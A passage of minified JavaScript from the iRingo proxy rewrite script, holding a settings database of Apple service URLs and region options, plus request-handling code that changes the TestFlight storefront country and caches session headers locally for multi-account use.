                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 88,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 88,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 89,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-ssl.ls.apple.com/ray/v1",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 262143,
                  minZ: 18,
                  minX: 0,
                  maxY: 262143,
                  minY: 0,
                  maxZ: 18,
                },
              ],
              identifier: 1,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 90,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf",
        },
        {
          scale: 0,
          style: 90,
          checksumType: 0,
          requestStyle: 0,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf",
        },
      ],
      urlInfoSet: [
        {
          backgroundRevGeoURL: {
            url: "https://gsp57-ssl-revgeo.ls.apple.com/dispatcher.arpc",
            supportsMultipathTCP: !1,
          },
          announcementsURL: {
            url: "https://gspe35-ssl.ls.apple.com/config/announcements?environment=prod",
            supportsMultipathTCP: !1,
          },
          searchAttributionManifestURL: {
            url: "https://gspe21-ssl.ls.apple.com/config/search-attribution-1292",
            supportsMultipathTCP: !1,
          },
          analyticsSessionlessURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          proactiveAppClipURL: {
            url: "https://gspe79-ssl.ls.apple.com/72/v2",
            supportsMultipathTCP: !1,
          },
          enrichmentSubmissionURL: {
            url: "https://sundew.ls.apple.com/v1/feedback/submission.arpc",
            supportsMultipathTCP: !1,
          },
          wifiConnectionQualityProbeURL: {
            url: "https://gsp10-ssl.ls.apple.com/hvr/wcq",
            supportsMultipathTCP: !1,
          },
          poiBusynessActivityCollectionURL: {
            url: "https://gsp53-ssl.ls.apple.com/hvr/rt_poi_activity",
            supportsMultipathTCP: !1,
          },
          offlineDataDownloadBaseURL: {
            url: "https://gspe121-ssl.ls.apple.com",
            supportsMultipathTCP: !1,
          },
          etaURL: {
            url: "https://gsp-ssl.ls.apple.com/directions.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          analyticsCohortSessionURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          resourcesURL: {
            url: "https://gspe21-ssl.ls.apple.com/",
            supportsMultipathTCP: !1,
          },
          problemOptInURL: {
            url: "https://sundew.ls.apple.com/grp/oi",
            supportsMultipathTCP: !1,
          },
          proactiveRoutingURL: {
            url: "https://gsp-ssl-commute.ls.apple.com/directions.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          feedbackLookupURL: {
            url: "https://gsp-ssl.ls.apple.com/feedback.arpc",
            supportsMultipathTCP: !1,
          },
          bluePOIDispatcherURL: {
            url: "https://gsp57-ssl-locus.ls.apple.com/dispatcher.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          batchTrafficProbeURL: {
            url: "https://gsp10-ssl.ls.apple.com/hvr/v2/loc",
            supportsMultipathTCP: !1,
          },
          batchReverseGeocoderURL: {
            url: "https://gsp36-ssl.ls.apple.com/revgeo.arpc",
            supportsMultipathTCP: !1,
          },
          spatialLookupURL: {
            url: "https://gsp51-ssl.ls.apple.com/api/v1.0/poi/data",
            supportsMultipathTCP: !1,
          },
          realtimeTrafficProbeURL: {
            url: "https://gsp9-ssl.apple.com/hvr/v2/rtloc",
            supportsMultipathTCP: !1,
          },
          addressCorrectionTaggedLocationURL: {
            url: "https://gsp47-ssl.ls.apple.com/ac",
            supportsMultipathTCP: !1,
          },
          problemSubmissionURL: {
            url: "https://sundew.ls.apple.com/v1/feedback/submission.arpc",
            supportsMultipathTCP: !1,
          },
          reverseGeocoderVersionsURL: {
            url: "https://gspe21-ssl.ls.apple.com/config/revgeo-version-11.plist",
            supportsMultipathTCP: !1,
          },
          wifiQualityTileURL: {
            url: "https://gspe85-ssl.ls.apple.com/wifi_request_tile",
            supportsMultipathTCP: !1,
          },
          problemCategoriesURL: {
            url: "https://gspe21-ssl.ls.apple.com/config/com.apple.GEO.BusinessLocalizedCategories-480.plist",
            supportsMultipathTCP: !1,
          },
          batchReverseGeocoderPlaceRequestURL: {
            url: "https://gsp36-ssl.ls.apple.com/revgeo_pr.arpc",
            supportsMultipathTCP: !1,
          },
          wifiQualityURL: {
            url: "https://gsp85-ssl.ls.apple.com/wifi_request",
            supportsMultipathTCP: !1,
          },
          problemStatusURL: {
            url: "https://sundew.ls.apple.com/grp/st",
            supportsMultipathTCP: !1,
          },
          feedbackSubmissionURL: {
            url: "https://sundew.ls.apple.com/v1/feedback/submission.arpc",
            supportsMultipathTCP: !1,
          },
          pressureProbeDataURL: {
            url: "https://gsp10-ssl.ls.apple.com/hvr/cpr",
            supportsMultipathTCP: !1,
          },
          offlineDataBatchListURL: {
            url: "https://gspe121-ssl.ls.apple.com/api/batchesForRegion",
            supportsMultipathTCP: !1,
          },
          offlineDataSizeURL: {
            url: "https://gspe121-ssl.ls.apple.com/api/sizeForRegion",
            supportsMultipathTCP: !1,
          },
          analyticsShortSessionURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          bcxDispatcherURL: {
            url: "https://gsp57-ssl-bcx.ls.apple.com/dispatcher.arpc",
            supportsMultipathTCP: !1,
          },
          alternateResourcesURL: [
            {
              url: "https://cdn.apple-mapkit.com/rap",
              supportsMultipathTCP: !1,
            },
          ],
          abExperimentURL: {
            url: "https://gsp-ssl.ls.apple.com/ab.arpc",
            supportsMultipathTCP: !1,
          },
          logMessageUsageURL: {
            url: "https://gsp64-ssl.ls.apple.com/a/v2/use",
            supportsMultipathTCP: !1,
          },
          addressCorrectionInitURL: {
            url: "https://gsp47-ssl.ls.apple.com/ac",
            supportsMultipathTCP: !1,
          },
          dispatcherURL: {
            url: "https://gsp-ssl.ls.apple.com/dispatcher.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          ugcLogDiscardURL: {
            url: "https://sundew.ls.apple.com/v1/log_message",
            supportsMultipathTCP: !1,
          },
          rapWebBundleURL: {
            url: "https://cdn.apple-mapkit.com/rap",
            supportsMultipathTCP: !1,
          },
          networkSelectionHarvestURL: {
            url: "https://gsp10-ssl.ls.apple.com/hvr/strn",
            supportsMultipathTCP: !1,
          },
          simpleETAURL: {
            url: "https://gsp-ssl.ls.apple.com/directions.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          businessPortalBaseURL: {
            url: "https://mapsconnect.apple.com/business/ui/claimPlace",
            supportsMultipathTCP: !1,
          },
          analyticsLongSessionURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          backgroundDispatcherURL: {
            url: "https://gsp57-ssl-background.ls.apple.com/dispatcher.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          webModuleBaseURL: {
            url: "https://maps.apple.com",
            supportsMultipathTCP: !1,
          },
          directionsURL: {
            url: "https://gsp-ssl.ls.apple.com/directions.arpc",
            supportsMultipathTCP: !0,
            alternativeMultipathTCPPort: 5228,
          },
          addressCorrectionUpdateURL: {
            url: "https://gsp47-ssl.ls.apple.com/ac",
            supportsMultipathTCP: !1,
          },
          logMessageUsageV3URL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
        },
      ],
      muninBucket: [
        { bucketID: 2, bucketURL: "https://gspe72-ssl.ls.apple.com/mnn_us" },
        { bucketID: 6, bucketURL: "https://gspe72-ssl.ls.apple.com/mnn_us" },
      ],
    },
  },
  p = { Settings: r, Configs: o },
  u = { Switch: !0, CountryCode: "US", NewsPlusUser: !0 },
  x = { Settings: u },
  c = { Switch: !0, CountryCode: "US", canUse: !0 },
  h = { Settings: c },
  d = {
    Switch: !0,
    CountryCode: "SG",
    Domains: ["web", "itunes", "app_store", "movies", "restaurants", "maps"],
    Functions: [
      "flightutilities",
      "lookup",
      "mail",
      "messages",
      "news",
      "safari",
      "siri",
      "spotlight",
      "visualintelligence",
    ],
    Safari_Smart_History: !0,
  },
  X = {
    VisualIntelligence: {
      enabled_domains: ["pets", "media", "books", "art", "nature", "landmarks"],
      supported_domains: [
        "ART",
        "BOOK",
        "MEDIA",
        "LANDMARK",
        "ANIMALS",
        "BIRDS",
        "FOOD",
        "SIGN_SYMBOL",
        "AUTO_SYMBOL",
        "DOGS",
        "NATURE",
        "NATURAL_LANDMARK",
        "INSECTS",
        "REPTILES",
        "ALBUM",
        "STOREFRONT",
        "LAUNDRY_CARE_SYMBOL",
        "CATS",
        "OBJECT_2D",
        "SCULPTURE",
        "SKYLINE",
        "MAMMALS",
      ],
    },
  },
  g = { Settings: d, Configs: X },
  Y = {
    Switch: "true",
    CountryCode: "US",
    MultiAccount: "false",
    Universal: "true",
  },
  Z = { Settings: Y },
  y = {
    Switch: !0,
    "Third-Party": !1,
    HLSUrl: "play-edge.itunes.apple.com",
    ServerUrl: "play.itunes.apple.com",
    Tabs: [
      "WatchNow",
      "Originals",
      "MLS",
      "Sports",
      "Kids",
      "Store",
      "Movies",
      "TV",
      "ChannelsAndApps",
      "Library",
      "Search",
    ],
    CountryCode: {
      Configs: "AUTO",
      Settings: "AUTO",
      View: ["SG", "TW"],
      WatchNow: "AUTO",
      Channels: "AUTO",
      Originals: "AUTO",
      Sports: "US",
      Kids: "US",
      Store: "AUTO",
      Movies: "AUTO",
      TV: "AUTO",
      Persons: "SG",
      Search: "AUTO",
      Others: "AUTO",
    },
  },
  v = {
    Locale: [
      ["AU", "en-AU"],
      ["CA", "en-CA"],
      ["GB", "en-GB"],
      ["KR", "ko-KR"],
      ["HK", "yue-Hant"],
      ["JP", "ja-JP"],
      ["MO", "zh-Hant"],
      ["TW", "zh-Hant"],
      ["US", "en-US"],
      ["SG", "zh-Hans"],
    ],
    Tabs: [
      {
        title: "主页",
        type: "WatchNow",
        universalLinks: [
          "https://tv.apple.com/watch-now",
          "https://tv.apple.com/home",
        ],
        destinationType: "Target",
        target: {
          id: "tahoma_watchnow",
          type: "Root",
          url: "https://tv.apple.com/watch-now",
        },
        isSelected: !0,
      },
      {
        title: "Apple TV+",
        type: "Originals",
        universalLinks: [
          "https://tv.apple.com/channel/tvs.sbd.4000",
          "https://tv.apple.com/atv",
        ],
        destinationType: "Target",
        target: {
          id: "tvs.sbd.4000",
          type: "Brand",
          url: "https://tv.apple.com/us/channel/tvs.sbd.4000",
        },
      },
      {
        title: "MLS Season Pass",
        type: "MLS",
        universalLinks: ["https://tv.apple.com/mls"],
        destinationType: "Target",
        target: {
          id: "tvs.sbd.7000",
          type: "Brand",
          url: "https://tv.apple.com/us/channel/tvs.sbd.7000",
        },
      },
      {
        title: "体育节目",
        type: "Sports",
        universalLinks: ["https://tv.apple.com/sports"],
        destinationType: "Target",
        target: {
          id: "tahoma_sports",
          type: "Root",
          url: "https://tv.apple.com/sports",
        },
      },
      {
        title: "儿童",
        type: "Kids",
        universalLinks: ["https://tv.apple.com/kids"],
        destinationType: "Target",
        target: {
          id: "tahoma_kids",
          type: "Root",
          url: "https://tv.apple.com/kids",
        },
      },
      {
        title: "电影",
        type: "Movies",
        universalLinks: ["https://tv.apple.com/movies"],
        destinationType: "Target",
        target: {
          id: "tahoma_movies",
          type: "Root",
          url: "https://tv.apple.com/movies",
        },
      },
      {
        title: "电视节目",
        type: "TV",
        universalLinks: ["https://tv.apple.com/tv-shows"],
        destinationType: "Target",
        target: {
          id: "tahoma_tvshows",
          type: "Root",
          url: "https://tv.apple.com/tv-shows",
        },
      },
      {
        title: "商店",
        type: "Store",
        universalLinks: ["https://tv.apple.com/store"],
        destinationType: "SubTabs",
        subTabs: [
          {
            title: "电影",
            type: "Movies",
            universalLinks: ["https://tv.apple.com/movies"],
            destinationType: "Target",
            target: {
              id: "tahoma_movies",
              type: "Root",
              url: "https://tv.apple.com/movies",
            },
          },
          {
            title: "电视节目",
            type: "TV",
            universalLinks: ["https://tv.apple.com/tv-shows"],
            destinationType: "Target",
            target: {
              id: "tahoma_tvshows",
              type: "Root",
              url: "https://tv.apple.com/tv-shows",
            },
          },
        ],
      },
      {
        title: "频道和 App",
        destinationType: "SubTabs",
        subTabsPlacementType: "ExpandedList",
        type: "ChannelsAndApps",
        subTabs: [],
      },
      { title: "资料库", type: "Library", destinationType: "Client" },
      {
        title: "搜索",
        type: "Search",
        universalLinks: ["https://tv.apple.com/search"],
        destinationType: "Target",
        target: {
          id: "tahoma_search",
          type: "Root",
          url: "https://tv.apple.com/search",
        },
      },
    ],
    i18n: {
      WatchNow: [
        ["en", "Home"],
        ["zh", "主页"],
        ["zh-Hans", "主頁"],
        ["zh-Hant", "主頁"],
      ],
      Movies: [
        ["en", "Movies"],
        ["zh", "电影"],
        ["zh-Hans", "电影"],
        ["zh-Hant", "電影"],
      ],
      TV: [
        ["en", "TV"],
        ["zh", "电视节目"],
        ["zh-Hans", "电视节目"],
        ["zh-Hant", "電視節目"],
      ],
      Store: [
        ["en", "Store"],
        ["zh", "商店"],
        ["zh-Hans", "商店"],
        ["zh-Hant", "商店"],
      ],
      Sports: [
        ["en", "Sports"],
        ["zh", "体育节目"],
        ["zh-Hans", "体育节目"],
        ["zh-Hant", "體育節目"],
      ],
      Kids: [
        ["en", "Kids"],
        ["zh", "儿童"],
        ["zh-Hans", "儿童"],
        ["zh-Hant", "兒童"],
      ],
      Library: [
        ["en", "Library"],
        ["zh", "资料库"],
        ["zh-Hans", "资料库"],
        ["zh-Hant", "資料庫"],
      ],
      Search: [
        ["en", "Search"],
        ["zh", "搜索"],
        ["zh-Hans", "搜索"],
        ["zh-Hant", "蒐索"],
      ],
    },
  },
  T = { Settings: y, Configs: v },
  f = (Database = {
    Default: Object.freeze({
      __proto__: null,
      Configs: s,
      Settings: t,
      default: m,
    }),
    Location: Object.freeze({ __proto__: null, Settings: n, default: l }),
    Maps: Object.freeze({
      __proto__: null,
      Configs: o,
      Settings: r,
      default: p,
    }),
    News: Object.freeze({ __proto__: null, Settings: u, default: x }),
    PrivateRelay: Object.freeze({ __proto__: null, Settings: c, default: h }),
    Siri: Object.freeze({
      __proto__: null,
      Configs: X,
      Settings: d,
      default: g,
    }),
    TestFlight: Object.freeze({ __proto__: null, Settings: Y, default: Z }),
    TV: Object.freeze({ __proto__: null, Configs: v, Settings: y, default: T }),
  });
function S(a, t, s) {
  console.log("☑️ Set Environment Variables", "");
  let {
    Settings: m,
    Caches: n,
    Configs: l,
  } = (function (a, t, s) {
    let m = i.getItem(a, s),
      n = {};
    if ("undefined" != typeof $argument && Boolean($argument)) {
      let i = Object.fromEntries(
        $argument
          .split("&")
          .map((e) => e.split("=").map((e) => e.replace(/\"/g, "")))
      );
      for (let a in i) e.set(n, a, i[a]);
    }
    const l = {
      Settings: s?.Default?.Settings || {},
      Configs: s?.Default?.Configs || {},
      Caches: {},
    };
    Array.isArray(t) || (t = [t]);
    for (let e of t)
      (l.Settings = {
        ...l.Settings,
        ...s?.[e]?.Settings,
        ...n,
        ...m?.[e]?.Settings,
      }),
        (l.Configs = { ...l.Configs, ...s?.[e]?.Configs }),
        m?.[e]?.Caches &&
          "string" == typeof m?.[e]?.Caches &&
          (m[e].Caches = JSON.parse(m?.[e]?.Caches)),
        (l.Caches = { ...l.Caches, ...m?.[e]?.Caches });
    return (
      (function e(i, a) {
        for (var t in i) {
          var s = i[t];
          i[t] = "object" == typeof s && null !== s ? e(s, a) : a(t, s);
        }
        return i;
      })(
        l.Settings,
        (e, i) => (
          "true" === i || "false" === i
            ? (i = JSON.parse(i))
            : "string" == typeof i &&
              (i = i.includes(",") ? i.split(",").map((e) => r(e)) : r(i)),
          i
        )
      ),
      l
    );
    function r(e) {
      return e && !isNaN(e) && (e = parseInt(e, 10)), e;
    }
  })(a, t, s);
  if (
    (m?.Tabs &&
      !Array.isArray(m?.Tabs) &&
      e.set(m, "Tabs", m?.Tabs ? [m.Tabs.toString()] : []),
    m?.Domains &&
      !Array.isArray(m?.Domains) &&
      e.set(m, "Domains", m?.Domains ? [m.Domains.toString()] : []),
    m?.Functions &&
      !Array.isArray(m?.Functions) &&
      e.set(m, "Functions", m?.Functions ? [m.Functions.toString()] : []),
    console.log(
      `✅ Set Environment Variables, Settings: ${typeof m}, Settings内容: ${JSON.stringify(
        m
      )}`,
      ""
    ),
    (l.Storefront = new Map(l.Storefront)),
    l.Locale && (l.Locale = new Map(l.Locale)),
    l.i18n)
  )
    for (let e in l.i18n) l.i18n[e] = new Map(l.i18n[e]);
  return { Settings: m, Caches: n, Configs: l };
}
const b = new a(" iRingo: ✈ TestFlight v3.2.0(1) request");
let U;
const C = new (class {
  constructor(e, i = void 0) {
    return console.log("\n🟧 URL v2.1.0\n"), (e = this.#s(e, i)), this;
  }
  #s(e, i = void 0) {
    const a =
        /(?:(?<protocol>\w+:)\/\/(?:(?<username>[^\s:"]+)(?::(?<password>[^\s:"]+))?@)?(?<host>[^\s@/]+))?(?<pathname>\/?[^\s@?]+)?(?<search>\?[^\s?]+)?/,
      t = /(?<hostname>.+):(?<port>\d+)$/;
    if (
      ((e = e.match(a)?.groups || {}),
      i && (!(i = i?.match(a)?.groups || {}).protocol || !i.hostname))
    )
      throw new Error(`🚨 ${name}, ${i} is not a valid URL`);
    if (
      ((e.protocol || i?.protocol) &&
        (this.protocol = e.protocol || i.protocol),
      (e.username || i?.username) && (this.username = e.username || i.username),
      (e.password || i?.password) && (this.password = e.password || i.password),
      (e.host || i?.host) &&
        ((this.host = e.host || i.host),
        Object.freeze(this.host),
        (this.hostname = this.host.match(t)?.groups.hostname ?? this.host),
        (this.port = this.host.match(t)?.groups.port ?? "")),
      e.pathname || i?.pathname)
    ) {
      if (
        ((this.pathname = e.pathname || i?.pathname),
        this.pathname.startsWith("/") || (this.pathname = "/" + this.pathname),
        (this.paths = this.pathname.split("/").filter(Boolean)),
        Object.freeze(this.paths),
        this.paths)
      ) {
        const e = this.paths[this.paths.length - 1];
        if (e?.includes(".")) {
          const i = e.split(".");
          (this.format = i[i.length - 1]), Object.freeze(this.format);
        }
      }
    } else this.pathname = "";
    if (
      (e.search || i?.search) &&
      ((this.search = e.search || i.search),
      Object.freeze(this.search),
      this.search)
    ) {
      const e = this.search
        .slice(1)
        .split("&")
        .map((e) => e.split("="));
      this.searchParams = new Map(e);
    }
    return (this.harf = this.toString()), Object.freeze(this.harf), this;
  }
  toString() {
    let e = "";
    return (
      this.protocol && (e += this.protocol + "//"),
      this.username &&
        (e += this.username + (this.password ? ":" + this.password : "") + "@"),
      this.hostname && (e += this.hostname),
      this.port && (e += ":" + this.port),
      this.pathname && (e += this.pathname),
      this.searchParams &&
        (e +=
          "?" +
          Array.from(this.searchParams)
            .map((e) => e.join("="))
            .join("&")),
      e
    );
  }
  toJSON() {
    return JSON.stringify({ ...this });
  }
})($request.url);
b.log(`⚠ url: ${C.toJSON()}`, "");
const L = $request.method,
  R = C.hostname,
  k = C.pathname,
  M = C.paths;
b.log(`⚠ METHOD: ${L}, HOST: ${R}, PATH: ${k}`, "");
const P = (
  $request.headers?.["Content-Type"] ?? $request.headers?.["content-type"]
)?.split(";")?.[0];
b.log(`⚠ FORMAT: ${P}`, ""),
  (async () => {
    const { Settings: e, Caches: a, Configs: t } = S("iRingo", "TestFlight", f);
    switch ((b.log(`⚠ Settings.Switch: ${e?.Switch}`, ""), e.Switch)) {
      case !0:
      default:
        let s = {};
        switch (L) {
          case "POST":
          case "PUT":
          case "PATCH":
          case "DELETE":
            switch (P) {
              case void 0:
              case "application/x-www-form-urlencoded":
              case "text/plain":
              default:
              case "application/x-mpegURL":
              case "application/x-mpegurl":
              case "application/vnd.apple.mpegurl":
              case "audio/mpegurl":
              case "text/xml":
              case "text/html":
              case "text/plist":
              case "application/xml":
              case "application/plist":
              case "application/x-plist":
              case "text/vtt":
              case "application/vtt":
                break;
              case "text/json":
              case "application/json":
                if (
                  ((s = JSON.parse($request.body ?? "{}")),
                  "testflight.apple.com" === R)
                )
                  switch (k) {
                    case "/v1/session/authenticate":
                      "AUTO" !== e.CountryCode &&
                        (s.storeFrontIdentifier =
                          s.storeFrontIdentifier.replace(
                            /\d{6}/,
                            t.Storefront.get(e.CountryCode)
                          ));
                      break;
                    case "/v1/properties/testflight":
                    case "/v1/devices":
                    case "/v1/devices/apns":
                    case "/v1/devices/add":
                    case "/v1/devices/remove":
                      break;
                    default:
                      switch (M[0]) {
                        case "v1":
                        case "v2":
                        case "v3":
                          if ("accounts" === M[1])
                            if ("settings" === M[2]);
                            else if ("apps" === M[3])
                              if ((M[4], "builds" === M[5]))
                                switch (M[7]) {
                                  case void 0:
                                    break;
                                  case "install":
                                    "AUTO" !== e.CountryCode &&
                                      (s.storefrontId = s.storefrontId.replace(
                                        /\d{6}/,
                                        t.Storefront.get(e.CountryCode)
                                      ));
                                }
                      }
                  }
                $request.body = JSON.stringify(s);
              case "application/protobuf":
              case "application/x-protobuf":
              case "application/vnd.google.protobuf":
              case "application/grpc":
              case "application/grpc+proto":
              case "applecation/octet-stream":
            }
          case "GET":
          case "HEAD":
          case "OPTIONS":
          case void 0:
          default:
            if ("testflight.apple.com" === R)
              switch (k) {
                case "/v1/session/authenticate":
                case "v1/properties/testflight":
                case "/v1/devices":
                case "/v1/devices/apns":
                case "/v1/devices/add":
                case "/v1/devices/remove":
                  break;
                default:
                  switch (e.MultiAccount) {
                    case !0:
                      b.log("⚠ 启用多账号支持", "");
                      const e =
                          $request?.headers?.["If-None-Match"] ??
                          $request?.headers?.["if-none-match"],
                        t =
                          $request?.headers?.["X-Request-Id"] ??
                          $request?.headers?.["x-request-id"],
                        s =
                          $request?.headers?.["X-Session-Id"] ??
                          $request?.headers?.["x-session-id"],
                        m =
                          $request?.headers?.["X-Session-Digest"] ??
                          $request?.headers?.["x-session-digest"];
                      if (a.data) {
                        switch ((b.log("⚠ Caches.data存在，读取", ""), M[0])) {
                          case "v1":
                          case "v2":
                          case "v3":
                            switch (M[1]) {
                              case "accounts":
                              case "messages":
                              case "apps":
                              default:
                                switch (M[2]) {
                                  case "settings":
                                  case void 0:
                                  default:
                                    switch (
                                      /[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}/.test(
                                        M[2]
                                      )
                                    ) {
                                      case !0:
                                        b.log(
                                          "⚠ PATHs[2]是UUID，替换url.pathname",
                                          ""
                                        ),
                                          (C.pathname = k.replace(
                                            /\/[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}\//i,
                                            `/${a.data.accountId}/`
                                          ));
                                      case !1:
                                        s !== a.headers["X-Session-Id"] &&
                                          (b.log(
                                            "⚠ sessionId不同，替换$request.headers",
                                            ""
                                          ),
                                          e &&
                                            (delete $request.headers?.[
                                              "If-None-Match"
                                            ],
                                            delete $request.headers?.[
                                              "if-none-match"
                                            ]),
                                          t &&
                                            ($request.headers?.[
                                              "X-Request-Id"
                                            ] &&
                                              ($request.headers[
                                                "X-Request-Id"
                                              ] = a.headers["X-Request-Id"]),
                                            $request.headers?.[
                                              "x-request-id"
                                            ] &&
                                              ($request.headers[
                                                "x-request-id"
                                              ] = a.headers["X-Request-Id"])),
                                          s &&
                                            ($request.headers?.[
                                              "X-Session-Id"
                                            ] &&
                                              ($request.headers[
                                                "X-Session-Id"
                                              ] = a.headers["X-Session-Id"]),
                                            $request.headers?.[
                                              "x-session-id"
                                            ] &&
                                              ($request.headers[
                                                "x-session-id"
                                              ] = a.headers["X-Session-Id"])),
                                          m &&
                                            ($request.headers?.[
                                              "X-Session-Digest"
                                            ] &&
                                              ($request.headers[
                                                "X-Session-Digest"
                                              ] =
                                                a.headers["X-Session-Digest"]),
                                            $request.headers?.[
                                              "x-session-digest"
                                            ] &&
                                              ($request.headers[
                                                "x-session-digest"
                                              ] =
                                                a.headers[
                                                  "X-Session-Digest"
                                                ])));
                                    }
                                    break;
                                  case a?.data?.accountId:
                                    b.log(
                                      "⚠ PATHs[2]与accountId相同，更新Caches",
                                      ""
                                    ),
                                      (a.headers = {
                                        "X-Request-Id": t,
                                        "X-Session-Id": s,
                                        "X-Session-Digest": m,
                                      }),
                                      i.setItem("@iRingo.TestFlight.Caches", a);
                                }
                              case "tc":
                            }
                        }
                        break;
                      }
                      b.log("⚠ Caches空，新写入", ""),
                        (a.headers = {
                          "X-Request-Id": t,
                          "X-Session-Id": s,
                          "X-Session-Digest": m,
                        }),
                        /[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}/.test(
                          M[2]
                        ) && (a.data = { accountId: M[2], sessionId: s }),
                        i.setItem("@iRingo.TestFlight.Caches", a);
                  }
              }
          case "CONNECT":
          case "TRACE":
        }
        ($request.url = C.toString()),
          b.log("🚧 调试信息", `$request.url: ${$request.url}`, "");
      case !1:
    }
  })()
    .catch((e) => b.logErr(e))
    .finally(() => {
      if (void 0 === U) b.done($request);
      else
        b.isQuanX()
          ? (U.status || (U.status = "HTTP/1.1 200 OK"),
            delete U.headers?.["Content-Length"],
            delete U.headers?.["content-length"],
            delete U.headers?.["Transfer-Encoding"],
            b.done(U))
          : b.done({ response: U });
    });
